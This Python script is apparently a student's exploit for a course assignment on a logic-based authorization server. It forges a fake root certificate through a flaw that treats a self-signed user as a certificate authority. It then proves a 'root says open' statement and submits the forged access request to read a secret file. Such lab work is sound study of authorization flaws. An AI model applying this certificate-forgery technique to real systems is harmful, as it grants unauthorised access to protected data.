import sys
import json

from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import HTTPError

from crypto import Credential, Certificate, AccessRequest
from auth import generate_request

from crypto import new_user, Agent, Credential, AccessRequest, verify_request
from logic import Proof, Rule, Sequent, Affirmation
from parser import parse
from prover import prove, stringify


def generate_exploit():

	exploiter = Agent('#exploiter')
	me = Agent('#kevinfan')

	# exploit: self-signed new user is thought of as #ca

	# make a new certif once with: 
	# certif = new_user(exploiter, Agent('#exploiter'))

	# use the exploit to generate a fake root certificate with the same public key as my own so I can sign open requests

	fakeroot = Certificate.make_for_key((Certificate.load_certificate(Agent('#kevinfan'))).public_key, Agent('#root'), Agent('#exploiter'))

	fakecredential = Credential.from_formula(parse('open(#kevinfan, <bigsecret.txt>)'), Agent('#kevinfan'))

	pf = prove(parse('ca(#exploiter), iskey(#exploiter, [e7:5c:3f:40:d3:2c:8b:ea:98:f6:f1:ba:98:53:4e:86]), sign((iskey(#root, [9e:8e:36:8c:6d:26:1d:e3:65:8e:b5:39:36:ea:c5:22])), [e7:5c:3f:40:d3:2c:8b:ea:98:f6:f1:ba:98:53:4e:86]), sign((open(#kevinfan, <bigsecret.txt>)), [9e:8e:36:8c:6d:26:1d:e3:65:8e:b5:39:36:ea:c5:22]) |- (#root says open(#kevinfan, <bigsecret.txt>))'))

	accessrequest = AccessRequest.make_for_proof(pf, me, [fakecredential], [Certificate.load_certificate(me), Certificate.load_certificate(exploiter), fakeroot, Certificate.load_certificate(Agent('#ca'))])

	# verified = verify_request(accessrequest, [certif, Certificate.load_certificate(Agent('#ca'))])
	
	return accessrequest

if __name__ == '__main__':

	req = generate_exploit()
	if req is None:
		sys.exit(0)

	request = Request("http://authproof.net:15316/accessrequest",
					  data=urlencode({
						  "request": req.serialize()
					  }).encode('utf-8'),
					  headers={'Content-Encoding': 'gzip'},
					  method='POST')
	try:
		response_object = urlopen(request, timeout=50)
	except HTTPError as e:
		response_object = e

	resp_json = json.load(response_object)
	print('\nserver response:')
	try:
		new_cred = Credential.from_json(resp_json)
		print(new_cred)
	except:
		print(resp_json)